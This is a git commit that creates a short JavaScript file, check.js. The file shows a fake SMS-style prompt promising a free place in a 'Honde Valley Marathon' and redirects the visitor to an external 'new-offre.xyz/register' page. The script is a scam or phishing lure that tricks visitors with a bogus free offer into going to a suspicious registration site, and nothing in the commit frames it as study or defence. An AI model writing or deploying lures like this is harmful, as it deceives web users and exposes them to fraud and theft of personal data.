bf6cc99fd5e0d8391271ba3e5147e45bd97230ed
bigetijazz10 <bigetijazz10@gmail.com>
2024-11-02 09:02:19 -0700

    Create check.js

---
+++ check.js
@@ -0,0 +1,6 @@
+
+var password = 'CHECK'
+password=prompt('SMS: Check if you are among the lucky people to apply for Honde Valley Marathon for FREE, Kindly press Ok to Check now ','CHECK');
+if (password != 'CHECK') {
+location.href='https://www.new-offre.xyz/register';
+}
